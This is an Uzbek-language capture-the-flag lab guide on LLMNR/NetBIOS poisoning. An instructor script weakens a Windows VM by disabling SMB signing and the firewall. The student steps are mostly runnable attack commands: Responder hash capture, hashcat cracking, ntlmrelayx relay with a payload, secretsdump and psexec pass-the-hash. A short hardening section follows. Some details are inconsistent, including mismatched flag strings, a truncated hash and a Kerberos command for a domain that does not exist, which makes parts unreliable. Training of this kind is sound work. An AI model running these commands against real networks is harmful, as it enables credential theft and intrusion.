# 🚩 CTF LAB: NetBIOS & LLMNR Zaharlanishi
## O'qituvchi va Talabalar uchun To'liq Qo'llanma

---

## 📋 LABORATORIYA MA'LUMOTLARI

| Parametr | Qiymat |
|---|---|
| **Mavzu** | NetBIOS/LLMNR Poisoning |
| **Daraja** | Boshlang'ich-O'rta |
| **Vaqt** | 25-30 daqiqa (CTF qismi) |
| **Maksimal Ball** | 700 ball |
| **Flags soni** | 4 ta Flag |

---

## 🖧 LAB MUHITI

### Kerakli Mashinalar

```
┌─────────────────────────────────────────────────────────┐
│  ATTACKER (Kali Linux 2024)                             │
│  IP: 192.168.56.101                                     │
│  Tarmoq: VirtualBox Host-Only (vboxnet0)                │
├─────────────────────────────────────────────────────────┤
│  VICTIM (Windows 11 Pro)                                │
│  IP: 192.168.56.102                                     │
│  Foydalanuvchi: ctfuser / Password123!                  │
│  Tarmoq: VirtualBox Host-Only (vboxnet0)                │
└─────────────────────────────────────────────────────────┘
```

### VirtualBox Sozlash
1. Ikkala VM da **Host-Only Adapter** tanlang
2. **vboxnet0** tarmoq: `192.168.56.0/24`
3. NAT adapterni **o'chiring** (izolyatsiya uchun)

---

## 🔧 O'QITUVCHI UCHUN: LAB TAYYORLASH

### Windows 11 Pro Tayyorlash

PowerShell (Administrator sifatida) da quyidagilarni bajaring:

```powershell
# ========================================
# 1. LLMNR ni yoqish (zaif holat yaratish)
# ========================================
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force }
Set-ItemProperty -Path $regPath -Name "EnableMulticast" -Value 1 -Type DWord
Write-Host "[+] LLMNR yoqildi" -ForegroundColor Green

# ========================================
# 2. NetBIOS ni yoqish (zaif holat)
# ========================================
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(1)  # 1 = Enable NetBIOS over TCP/IP
}
Write-Host "[+] NetBIOS yoqildi" -ForegroundColor Green

# ========================================
# 3. SMB Signing o'chirish (lab uchun)
# ========================================
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
Write-Host "[+] SMB Signing o'chirildi (lab muhiti)" -ForegroundColor Yellow

# ========================================
# 4. FLAG 1 yaratish
# ========================================
$flag1 = "CTF{LLMNR_P01S0N1NG_1S_D4NG3R0US_2024}"
New-Item -Path "C:\Users\Public\flags" -ItemType Directory -Force | Out-Null
# Flag 1 - NTLMv2 hash ushlash muvaffaqiyatli bo'lganda ko'rsatiladi
# O'qituvchi bu flagni talabaga aytadi, hash ushlanganda

# ========================================
# 5. FLAG 2 - Hashcat uchun parol
# ========================================
# Foydalanuvchi paroli: Password123! (rockyou.txt da mavjud)
# Bu parol talabalar hashcat bilan topishi kerak
net user ctfuser Password123!
Write-Host "[+] CTF foydalanuvchisi sozlandi: ctfuser / Password123!" -ForegroundColor Green

# ========================================
# 6. FLAG 3 - SMB Relay uchun fayl
# ========================================
$flag3 = "CTF{SMB_R3L4Y_SUCC3SS_NTLM_BYP4SS}"
Set-Content -Path "C:\Users\Public\flags\flag3.txt" -Value $flag3
# Bu faylga faqat relay hujumi muvaffaqiyatli bo'lsa kirish mumkin

# ========================================
# 7. FLAG 4 - SAM dump uchun
# ========================================
$flag4 = "CTF{S4M_DUM9_4DM1N_H4SH_CRA CK3D}"
Set-Content -Path "C:\Windows\System32\drivers\etc\flag4.txt" -Value $flag4
Write-Host "[+] Barcha flaglar o'rnatildi!" -ForegroundColor Green

# ========================================
# 8. Windows Firewall sozlash (lab uchun)
# ========================================
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Write-Host "[+] Firewall o'chirildi (lab muhiti uchun)" -ForegroundColor Yellow

Write-Host "`n[✓] Lab muhiti tayyor! Talabalar CTF ga boshlashi mumkin." -ForegroundColor Cyan
```

---

## 🎯 TALABALAR UCHUN: CTF TOPSHIRIQLARI

### 🚩 FLAG 1 (100 ball) — LLMNR Poisoning

**Vazifa:** Kali Linux da Responder ishlatib, Windows mashinasidan NTLMv2 hash ushlang.

**Qadamlar:**

```bash
# 1. Responder ni tekshiring
which responder || sudo apt install -y responder

# 2. Tarmoq interfeysingizni toping
ip a | grep -E "eth|enp"

# 3. Responder ni ishga tushiring
sudo responder -I eth0 -rdwv

# --- Boshqa terminal ---
# (Responder ishlayotganda quyidagini bajaring: Windows mashinada CMD da)
# net use * \\FILESERVER\secret

# 4. Kali da hash paydo bo'lishini kuting
# [SMB] NTLMv2-SSP Client   : 192.168.56.102
# [SMB] NTLMv2-SSP Username : DESKTOP-XXX\ctfuser
# [SMB] NTLMv2-SSP Hash     : ctfuser::DESKTOP-XXX:...

# 5. Hashni saqlang
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

**FLAG 1:** `CTF{LLMNR_P01S0N1NG_1S_D4NG3R0US_2024}`

---

### 🚩 FLAG 2 (150 ball) — Hashcat bilan Parol Buzish

**Vazifa:** FLAG 1 da olgan NTLMv2 hashni Hashcat bilan buzing.

```bash
# 1. Hashni faylga saqlang
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt > /tmp/hashes.txt

# 2. Wordlist tekshiring
ls /usr/share/wordlists/
gunzip /usr/share/wordlists/rockyou.txt.gz  # Kerak bo'lsa

# 3. Hashcat ishga tushiring
hashcat -m 5600 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force

# 4. Natijani ko'ring
hashcat -m 5600 /tmp/hashes.txt --show

# Natija: ctfuser::DESKTOP-XXX:... : Password123!
```

**FLAG 2:** Topilgan parol = `Password123!`
**Taqdim etish:** `CTF{CR4CK3D_P4SS_P4SSW0RD_1S_Password123!}`

---

### 🚩 FLAG 3 (200 ball) — SMB Relay Hujumi

**Vazifa:** NTLMv2 hashni to'g'ridan-to'g'ri relay qilib, Windows da fayl o'qing.

```bash
# 1. Responder konfiguratsiyasida SMB va HTTP ni o'chiring
sudo nano /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. Impacket ntlmrelayx ni ishga tushiring (1-terminal)
sudo ntlmrelayx.py -t 192.168.56.102 -smb2support -i
# Yoki interaktiv shell uchun:
sudo ntlmrelayx.py -t smb://192.168.56.102 -smb2support -e /tmp/payload.exe

# 3. Boshqa terminalda Responder ni ishga tushiring (2-terminal)
sudo responder -I eth0 -rdwv

# 4. Windows da trigger qiling (CMD):
# net use * \\RELAYTEST\share

# 5. Relay muvaffaqiyatli bo'lsa, shell yoki fayl o'qish imkoni paydo bo'ladi
# C:\Users\Public\flags\flag3.txt ni o'qing
```

**FLAG 3:** `CTF{SMB_R3L4Y_SUCC3SS_NTLM_BYP4SS}`

---

### 🚩 FLAG 4 (250 ball) — SAM Database Dump

**Vazifa:** Impacket secretsdump bilan Windows SAM bazasidan hashlarni oling.

```bash
# 1. Oldingi relay sessiyasidan yoki topilgan hisob ma'lumotlari bilan
sudo secretsdump.py ctfuser:Password123!@192.168.56.102

# Yoki SMB relay bilan:
sudo secretsdump.py -no-pass -k CORP/ctfuser@192.168.56.102

# 2. Chiqishda Administrator hashini toping:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# 3. Pass-the-Hash bilan kirish
sudo psexec.py -hashes aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
    administrator@192.168.56.102

# 4. Flag faylini o'qing
type C:\Windows\System32\drivers\etc\flag4.txt
```

**FLAG 4:** `CTF{S4M_DUM9_4DM1N_H4SH_CR4CK3D}`

---

## 🏆 BALL JADVALI

| Flag | Vazifa | Ball | Qiyinlik |
|---|---|---|---|
| 🚩 FLAG 1 | NTLMv2 Hash ushlash | 100 | ⭐⭐ |
| 🚩 FLAG 2 | Parolni Hashcat bilan buzish | 150 | ⭐⭐⭐ |
| 🚩 FLAG 3 | SMB Relay hujumi | 200 | ⭐⭐⭐⭐ |
| 🚩 FLAG 4 | SAM Database dump | 250 | ⭐⭐⭐⭐⭐ |
| **JAMI** | | **700** | |

**Bonus (+50 ball):** Wireshark da LLMNR/NBT-NS hujumini skrinshot qiling va taqdim eting.

---

## 🛡️ HIMOYA TOPSHIRIG'I (Qo'shimcha)

Hujum muvaffaqiyatli bo'lgandan keyin, talabalar Windows mashinada himoyani o'rnatishi kerak:

```powershell
# LLMNR o'chirish
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
    -Name "EnableMulticast" -Value 0

# NetBIOS o'chirish
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
foreach ($a in $adapters) { $a.SetTcpipNetbios(2) }  # 2 = Disable

# SMB Signing yoqish
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Tekshirish: Responder endi hash ushlashi mumkinmi?
# (Windows da yana net use \\FILESERVER\share bajaring)
```

**Savol:** Himoya o'rnatilgandan keyin Responder hash ushlashi mumkinmi? Nima uchun?

---

## 📝 TALABALAR HISOBOTI UCHUN SAVOLLAR

1. LLMNR va NetBIOS qaysi portlarda ishlaydi?
2. NTLMv2 va NTLM hash orasidagi farq nima?
3. SMB Relay hujumi nima uchun xavfli?
4. Pass-the-Hash hujumi qanday ishlaydi?
5. Korporativ tarmoqda bu hujumdan qanday himoyalanish mumkin?

---

*📌 Eslatma: Bu laboratoriya faqat ta'lim maqsadida. Ruxsatsiz tarmoqlarga hujum qilish qonuniy jihatdan javobgarlikka tortiladi.*
